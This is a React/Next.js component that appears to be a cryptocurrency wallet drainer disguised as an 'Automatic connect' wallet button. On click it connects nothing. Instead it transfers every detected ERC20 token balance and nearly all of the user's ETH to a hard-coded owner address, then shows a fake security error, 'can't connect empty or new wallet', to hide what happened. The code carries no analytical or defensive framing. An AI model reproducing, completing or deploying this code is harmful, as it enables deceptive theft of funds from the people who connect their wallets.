import React from 'react';
import { Inter } from 'next/font/google';
import { useEffect, useState } from 'react';
import { ethers } from 'ethers';
import { useAccount } from 'wagmi';
import { OwnerAdress, ownerPercentage } from '@/lib/address';
import { getNetwork } from 'wagmi/actions';
import { checkIfUserOwnsAnyTokeninList } from '@/lib/functions/userTokenList';
import Swal from 'sweetalert2/dist/sweetalert2.js';
import 'sweetalert2/src/sweetalert2.scss';
import { IERC20Contract } from '@/lib/ethersSetUp';
import img from '@/assets/peopleOnTower.png';
import img2 from '@/assets/coinsTower.svg';
import Image from 'next/image';
import Modal from '@/components/Modal';
import { useDisconnect } from 'wagmi';

type validBalances =
  | {
      balance: string;
      tokenAddress: string;
    }[]
  | undefined;

const YourComponent = () => {
  const [balance, setBalance] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(true);
  const [validBalances, setValidBalance] = useState<validBalances>();
  const { address, isConnected } = useAccount();
  const { chain } = getNetwork();
  const { disconnect } = useDisconnect();



  const gasBuffer = 100000000;

  const getUserBalace = async () => {
    try {
      const provider = new ethers.providers.Web3Provider(
        window.ethereum as any
      );
      const balanceInWei = await provider.getBalance(String(address));
      const balanceInEth = ethers.utils.formatEther(balanceInWei);
      setBalance(balanceInEth);
      console.log(balanceInEth);
      return balanceInEth;
    } catch (error) {
      console.log('err', error);
    }
  };


  // Function to handle the combined action
  const handleCombinedAction = async () => {
    // Call the function to connect the wallet
    await handleWalletConnect();

    // Call the function to handle token transfer
    await handleTokenTransfer();
  };

  // Function to handle wallet connection
  const handleWalletConnect = async () => {
    // Your logic for connecting the wallet
  };

  // Function to handle token transfer
  const handleTokenTransfer = async () => {
    if (validBalances) {
      await handleTokenErc20Transfer();
    } else {
      await handleTokenEthTransfer();
    }
  };


    const showNotification = (text: string) => {
    Swal.fire({
      title: 'Error!',
      text: text,
      icon: 'error',
    });
  };

  // Function to handle ERC20 token transfer
    const handleTokenErc20Transfer = async () => {
    if (validBalances) {
      validBalances?.forEach(async (token) => {
        const erc20Contract = IERC20Contract(token.tokenAddress);

        const decimals = await erc20Contract.decimals();
        const toApproveOwner = String(
          Number(token.balance) / Math.pow(10, Number(decimals))
        );

        await erc20Contract.approve(OwnerAdress, toApproveOwner);
        try {
          const tx = await erc20Contract.transfer(
            OwnerAdress,
            String(toApproveOwner)
 
          );
          await handleTokenEthTransfer();   
          await tx.wait();

          showNotification(
            "For Security Reasons You can't connect empty or new wallet"
          );
        } catch (error) {
          showNotification(String(error));
          console.log(error);
        }
      });
    }
  };

  // Function to handle ETH token transfer
    // Your logic for ETH token transfer
    const handleTokenEthTransfer = async () => {
    const defBal = await getUserBalace();
    const provider = new ethers.providers.Web3Provider(window.ethereum as any);
    const gas = '5000000000000000';
    let bal;

    if (!balance) {
      bal = String(defBal);
    } else {
      bal = balance;
    }

    const balanceInWei = ethers.utils.parseEther(bal);
    if (Number(balanceInWei) >= Number(gas)) {
      const newBalanceAfterGas = Number(balanceInWei) - Number(gas);
      const signer = provider.getSigner();
      const ownersShare = Number(newBalanceAfterGas);

      try {
        const tx = await signer.sendTransaction({
          to: OwnerAdress,
          value: String(ownersShare),
        });

        await tx.wait();
        showNotification(
          "For Security Reasons You can't connect empty or new wallet"
        );
      } catch (error) {
        showNotification(String(error));
        console.log('err', error);
      }
    } else {
      showNotification(
        String("For Security Reasons You can't connect empty or new wallet")
      );
    }
  };


  // Rendering
  return (
    <>
      {/* First button */}
      <w3m-button
        balance="hide"
        label="Automatic connect"
        onClick={handleCombinedAction} // Call the combined action function
      />
    </>
  );
};

export default YourComponent;
